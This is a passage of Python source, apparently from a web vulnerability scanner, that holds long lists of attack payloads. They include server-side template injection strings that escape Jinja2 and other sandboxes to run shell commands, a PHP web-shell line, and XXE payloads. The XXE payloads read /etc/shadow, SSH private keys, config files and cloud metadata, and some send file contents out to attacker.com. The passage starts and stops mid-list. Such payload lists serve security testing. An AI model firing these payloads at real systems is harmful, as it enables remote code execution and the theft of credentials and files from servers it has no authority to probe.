            "<?php echo `id`; ?>",
            "{{ php }} echo `id`; {{ /php }}",
            

            "{{ 'id' | shellescape }}",
            "{{ shop.metafields.global }}",
            

            "{{inject 'id' \"global.process.mainModule.require('child_process').execSync('id')\"}}",
            

            "<!-- {.section test} -->{.repeated section test}<!-- {.end} -->",
            

            "{{#with test}}{{/with}}",
            

            "<div class=\"wsite-element weebly-element-featured-products\"></div>",
            

            "<div class=\"w-dyn-list\"></div>",
            

            "{{#get \"posts\"}} {{/get}}",
            "{{#foreach posts}} {{/foreach}}",
            

            "{{ 'id' | system }}",
            "{{ 'id' | exec }}",
            

            "{{ php }} echo `id`; {{ /php }}",
            

            "<?php echo `id`; ?>",
            "{{ echo `id`; }}",
            

            "{$Now}",
            "{$BaseURL}",
            

            "<f:format.raw>{object}</f:format.raw>",
            "<f:link.external uri=\"javascript:alert(1)\">Test</f:link.external>",
            

            "{node.properties.title}",
            "{q(node).property('title')}",
            

            "{$this->document->getProperty('title')}",
            "{$this->getParam('id')}",
            

            "@CurrentPage.Name",
            "@CurrentPage.Url",
            

            "$Sitecore.Context.Item.Name",
            "$Sitecore.Context.Site.Name",
            

            "{% DocumentName %}",
            "{% CurrentUser.UserName %}",
            

            "<%= PageProperty(\"PageName\") %>",
            "<%= CurrentPage.PageName %>",
            

            "<%= currentNode.name %>",
            "<%= currentPage.name %>",
            

            "<%@ page import=\"java.lang.Runtime\" %>",
            "<%= Runtime.getRuntime().exec(\"id\") %>",
            

            "<% out.println(\"test\"); %>",
            "<%= \"test\" %>",
            

            "<%= themeDisplay.getCompanyId() %>",
            "<%= user.getFullName() %>",
            

            "<% out.println(\"test\"); %>",
            "<%= \"test\" %>",
            

            "<%= Document.getTitle() %>",
            "<%= Session.getPrincipal().getName() %>",
            

            "<% out.println(\"test\"); %>",
            "<%= \"test\" %>",
            

            "<% out.println(\"test\"); %>",
            "<%= \"test\" %>",
            

            "<SharePoint:ProjectProperty Property=\"Title\" runat=\"server\" />",
            "<asp:Label runat=\"server\" Text=\"<%$Resources:wss,multipages_homelink_text%>\" />",
            

            "&ITEM_NAME.",
            "&APP_ID.",
            

            "<% =CurrentUser.Name %>",
            "<% =GetSiteProperty(\"Title\") %>",
            

            "\"{$CurrentUser/Name}\"",
            "\"{$CurrentObject/Name}\"",
            

            "{!$User.FirstName}",
            "{!$Organization.Name}",
            

            "${JS:gs.getUserID()}",
            "${JS:gs.getUserName()}",
            

            "{{current_user.name}}",
            "{{ticket.requester.name}}",
            

            "{{ticket.requester.name}}",
            "{{ticket.agent.name}}",
            

            "{$_USER['fullname']}",
            "{$_TICKET['subject']}",
            

            "<?php echo `id`; ?>",
            "<?php system($_GET['cmd']); ?>",
            

            "[% Data.Name %]",
            "[% Env(\"User\") %]",
            

            "<% $RT::SystemUser->Name %>",
            "<% $session{'CurrentUser'}->Name %>",
            

            "$user.fullName",
            "$issue.summary",
            

            "$user.fullName",
            "$space.name",
            

            "${user.displayName}",
            "${repository.name}",
            

            "{{ user.login }}",
            "{{ repository.name }}",
            

            "{{ user.name }}",
            "{{ project.name }}",
            

            "$(Build.RequestedFor)",
            "$(Build.Repository.Name)",
            

            "${BUILD_NUMBER}",
            "${JOB_NAME}",
            

            "%build.number%",
            "%teamcity.project.id%",
            

            "${bamboo.buildNumber}",
            "${bamboo.planName}",
            

            "${CIRCLE_PROJECT_REPONAME}",
            "${CIRCLE_USERNAME}",
            

            "${TRAVIS_REPO_SLUG}",
            "${TRAVIS_COMMIT}",
            

            "${APPVEYOR_PROJECT_SLUG}",
            "${APPVEYOR_REPO_COMMIT}",
            

            "${DRONE_REPO}",
            "${DRONE_COMMIT}",
            

            "${SEMAPHORE_GIT_DIR}",
            "${SEMAPHORE_GIT_BRANCH}",
            

            "${WERCKER_GIT_BRANCH}",
            "${WERCKER_GIT_COMMIT}",
            

            "${CI_BRANCH}",
            "${CI_COMMIT_ID}",
            

            "${BUDDY_EXECUTION_ID}",
            "${BUDDY_PIPELINE_NAME}",
            

            "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('id')}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.from_pyfile('/etc/passwd')}}",
            "{{url_for.__globals__.__builtins__['open']('/etc/passwd').read()}}",
            

            "{{'o'+'s'}}",
            "{{'o' 's'}}",
            "{{'o'|'s'}}",
            "{{['o','s']|join}}",
            "{{'o'~'s'}}",
            
            "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            "{{request|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fmro\\x5f\\x5f')|first|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()|attr('\\x5f\\x5fgetitem\\x5f\\x5f')(132)|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('popen')('id')|attr('read')()}}",
            

            "{{request|attr(request.args.c)|attr(request.args.m)|attr(request.args.g)()|attr(request.args.i)(request.args.o)|attr(request.args.p)(request.args.cmd)|attr(request.args.r)()}}?c=__class__&m=__mro__&g=__getitem__&i=__init__&o=__globals__&p=popen&cmd=id&r=read",
            
            "{{''[request.args.c][request.args.m][2][request.args.s]()[132][request.args.i][request.args.g]['os'][request.args.p]('id')[request.args.r]()}}?c=__class__&m=__mro__&s=__subclasses__&i=__init__&g=__globals__&p=popen&r=read",
            

            "{{'\\u005f\\u005fclass\\u005f\\u005f'}}",
            "{{'\\x5f\\x5fclass\\x5f\\x5f'}}",
            "{{'\\146\\145\\157\\160\\154\\145'}}",
            

            "{{'__cl' 'ass__'}}",
            "{{'__cl'+'ass__'}}",
            "{{'__cl'|'ass__'}}",
            "{{['__cl','ass__']|join}}",
            "{{'__cl'~'ass__'}}",
            

            "{{0x2a}}",
            "{{0x2a*0x2a}}",
            "{{0x2a.__class__}}",
            

            "{{052}}",
            "{{052.__class__}}",
            

            "{{0b101010}}",
            "{{0b101010.__class__}}",
            

            "{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__[chr(111)+chr(115)].__dict__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(105)+chr(100)).read()}}",
            

            "{% extends \"layout.html\" %}{% block content %}{{7*7}}{% endblock %}",
            "{% include \"header.html\" %}{{7*7}}{% endinclude %}",
            

            "{% macro test() %}{{7*7}}{% endmacro %}{{test()}}",
            "{% call test() %}{{7*7}}{% endcall %}",
            

            "{% set x = 7*7 %}{{x}}",
            "{% with x = 7*7 %}{{x}}{% endwith %}",
            

            "{% for i in range(1) %}{{7*7}}{% endfor %}",
            "{% while True %}{{7*7}}{% endwhile %}",
            

            "{% if True %}{{7*7}}{% endif %}",
            "{% if 1==1 %}{{7*7}}{% endif %}",
            

            "{{((7*7))}}",
            "{{7*7 if True else 0}}",
            "{{7*7 or 0}}",
            "{{7*7 and 1}}",
            

            "{{request['application']}}",
            "{{request.get('application')}}",
            "{{request.__getattribute__('application')}}",
            "{{getattr(request, 'application')}}",
            

            "{{request.__class__()}}",
            "{{request|string}}",
            "{{request|tojson}}",
            "{{request|safe}}",
            

            "{{7*'7'}}",
            "{{'7'*7}}",
            "{{7**2}}",
            "{{49//1}}",
            "{{98/2}}",
            "{{147/3}}",
            

            "{{'%s' % 7*7}}",
            "{{'{0}'.format(7*7)}}",
            "{{f'{7*7}'}}",
            

            "{{True}}",
            "{{False}}",
            "{{None}}",
            "{{not False}}",
            

            "{{7==7}}",
            "{{7!=8}}",
            "{{7>6}}",
            "{{7<8}}",
            "{{7>=7}}",
            "{{7<=7}}",
            

            "{{7 in [7]}}",
            "{{7 not in [8]}}",
            

            "{{7 is 7}}",
            "{{7 is not 8}}",
            

            "{{7&7}}",
            "{{7|7}}",
            "{{7^0}}",
            "{{~-8}}",
            "{{7<<1}}",
            "{{14>>1}}",
            

            "{{7+0j}}",
            "{{complex(7,0)}}",
            

            "{{abs(-7)}}",
            "{{divmod(49,7)}}",
            "{{max(7,7)}}",
            "{{min(7,7)}}",
            "{{pow(7,2)}}",
            "{{round(7.0)}}",
            "{{sum([7,7])}}",
            

            "{{int('7')}}",
            "{{float('7')}}",
            "{{str(7)}}",
            "{{bool(7)}}",
            "{{list('7')}}",
            "{{tuple('7')}}",
            "{{dict(a=7)}}",
            "{{set('7')}}",
            

            "{{'7'.capitalize()}}",
            "{{'7'.center(3)}}",
            "{{'7'.count('7')}}",
            "{{'7'.encode()}}",
            "{{'7'.endswith('7')}}",
            "{{'7'.find('7')}}",
            "{{'7'.format()}}",
            "{{'7'.index('7')}}",
            "{{'7'.isalnum()}}",
            "{{'7'.isalpha()}}",
            "{{'7'.isdigit()}}",
            "{{'7'.islower()}}",
            "{{'7'.isnumeric()}}",
            "{{'7'.isspace()}}",
            "{{'7'.istitle()}}",
            "{{'7'.isupper()}}",
            "{{'7'.join('7')}}",
            "{{'7'.ljust(3)}}",
            "{{'7'.lower()}}",
            "{{'7'.lstrip()}}",
            "{{'7'.partition('7')}}",
            "{{'7'.replace('7','7')}}",
            "{{'7'.rfind('7')}}",
            "{{'7'.rindex('7')}}",
            "{{'7'.rjust(3)}}",
            "{{'7'.rpartition('7')}}",
            "{{'7'.rsplit()}}",
            "{{'7'.rstrip()}}",
            "{{'7'.split()}}",
            "{{'7'.splitlines()}}",
            "{{'7'.startswith('7')}}",
            "{{'7'.strip()}}",
            "{{'7'.swapcase()}}",
            "{{'7'.title()}}",
            "{{'7'.translate({})}}",
            "{{'7'.upper()}}",
            "{{'7'.zfill(3)}}",
            

            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "{{7*'7'}}",
            "{{''.__class__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "<%= system('id') %>",
            "{{config}}",
            "{{7*7}}",
        ]
        
        self.xxe_payloads = [

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hosts">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/group">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///C:/windows/win.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///C:/windows/system.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///C:/boot.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///C:/windows/System32/config/SAM">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///C:/windows/repair/SAM">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ATTACKER_ID.attacker.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://attacker.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "ftp://attacker.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "gopher://attacker.com/xxe.dtd">%remote;]><root/>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/shadow"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///C:/windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><root/>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://id">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://ls">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://whoami">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "zip:///etc/passwd#test">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "compress.zlib:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "compress.bzip2:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "compress.zlib://http://attacker.com/test">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "data://text/plain;base64,PD94bWwgdmVyc2lvbj0iMS4wIj8+">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "data://text/plain,%3C%3Fxml%20version%3D%221.0%22%3F%3E">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "data://text/xml,%3C%3Fxml%20version%3D%221.0%22%3F%3E">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><root>&all;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/user-data/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:22">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:3306">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:5432">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:6379">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://10.0.0.1">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://192.168.1.1">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://172.16.0.1">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:80">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:443">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:8080">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:22">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "ftp://attacker.com/test">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "ftp://anonymous:anonymous@attacker.com/test">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "gopher://attacker.com/test">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "gopher://attacker.com:70/_test">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "dict://attacker.com/test">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "dict://attacker.com:11211/stat">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/self/environ">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/self/cmdline">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/version">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/mounts">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/net/tcp">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/net/udp">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/self/fd/0">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/self/fd/1">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/self/fd/2">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///home/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///tmp/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///root/">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/nginx/nginx.conf">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/apache2/apache2.conf">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/httpd/conf/httpd.conf">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/mysql/my.cnf">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/ssh/sshd_config">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/index.php">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/config.php">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/.env">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/wp-config.php">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/web.config">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/log/apache2/access.log">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/log/apache2/error.log">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/log/nginx/access.log">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/log/nginx/error.log">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/log/syslog">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/log/auth.log">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/log/messages">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///root/.ssh/id_rsa">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///root/.ssh/id_dsa">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///root/.ssh/authorized_keys">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///home/*/.ssh/id_rsa">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/lib/mysql/mysql/user.MYD">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/lib/postgresql/data/pg_hba.conf">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/ssl/certs/ca-certificates.crt">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/ssl/private/ssl-cert-snakeoil.key">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/pki/tls/certs/ca-bundle.crt">]><root>&test;</root>',
            

            '\xEF\xBB\xBF<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '\xFE\xFF<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '\xFF\xFE<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0" encoding="UTF-32"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0" encoding="ASCII"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0" encoding="Windows-1252"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            

            '<?xml version="1.0"?><root xmlns:xxe="http://example.com"><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><xxe:data>&test;</xxe:data></root>',
            '<?xml version="1.0"?><a:root xmlns:a="http://example.com"><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><a:data>&test;</a:data></a:root>',
            

            '<?xml version="1.0" standalone="no"?><!DOCTYPE svg [<!ENTITY test SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&test;</svg>',
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><!DOCTYPE svg [<!ENTITY test SYSTEM "file:///etc/passwd">]><text>&test;</text></svg>',
            

            '<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soap:Body>&test;</soap:Body></soap:Envelope>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE rss [<!ENTITY test SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><title>&test;</title></channel></rss>',
            

            '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE feed [<!ENTITY test SYSTEM "file:///etc/passwd">]><feed xmlns="http://www.w3.org/2005/Atom"><title>&test;</title></feed>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html [<!ENTITY test SYSTEM "file:///etc/passwd">]><html xmlns="http://www.w3.org/1999/xhtml">&test;</html>',
            

            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            

            '<?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?><!DOCTYPE xpacket [<!ENTITY test SYSTEM "file:///etc/passwd">]><x:xmpmeta xmlns:x="adobe:ns:meta/">&test;</x:xmpmeta><?xpacket end="w"?>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/schema/xml-core/entities.dtd"><!ENTITY % ISOboxes \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;\'>%local_dtd;]><root/>',
            

            '\xFE\xFF\x00<\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00"\x001\x00.\x000\x00"\x00?\x00>\x00<\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00r\x00o\x00o\x00t\x00 \x00[\x00<\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00t\x00e\x00s\x00t\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00"\x00f\x00i\x00l\x00e\x00:\x00/\x00/\x00/\x00e\x00t\x00c\x00/\x00p\x00a\x00s\x00s\x00w\x00d\x00"\x00>\x00]\x00>\x00<\x00r\x00o\x00o\x00t\x00>\x00&\x00t\x00e\x00s\x00t\x00;\x00<\x00/\x00r\x00o\x00o\x00t\x00>',
            

            '\xFF\xFE<\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00"\x001\x00.\x000\x00"\x00?\x00>\x00<\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00r\x00o\x00o\x00t\x00 \x00[\x00<\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00t\x00e\x00s\x00t\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00"\x00f\x00i\x00l\x00e\x00:\x00/\x00/\x00/\x00e\x00t\x00c\x00/\x00p\x00a\x00s\x00s\x00w\x00d\x00"\x00>\x00]\x00>\x00<\x00r\x00o\x00o\x00t\x00>\x00&\x00t\x00e\x00s\x00t\x00;\x00<\x00/\x00r\x00o\x00o\x00t\x00>',
            

            '<?xml version="1.0"?>\x00<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root \x00[<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [\x00<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % start "<![CDATA["><!ENTITY % goodies SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><root>&all;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "ftp://attacker.com:2121/xxe.dtd">%remote;]><root/>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % param1 "file:///etc/passwd"><!ENTITY % param2 "http://attacker.com/?x=%param1;">]><root/>',
            

